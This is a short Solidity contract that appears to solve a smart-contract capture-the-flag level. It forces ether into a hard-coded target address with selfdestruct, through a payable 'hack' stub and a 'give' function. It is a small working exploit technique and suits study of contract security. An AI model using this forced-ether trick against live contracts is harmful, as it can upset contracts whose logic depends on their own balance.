pragma solidity ^0.4.18;
 

contract Force {
    Force target = Force(0x711f4634bCeA47fB09703331e3AEb1ae7DAA75CA);

    function hack() payable {}

    function give() public payable {
        selfdestruct(target);
    }
}

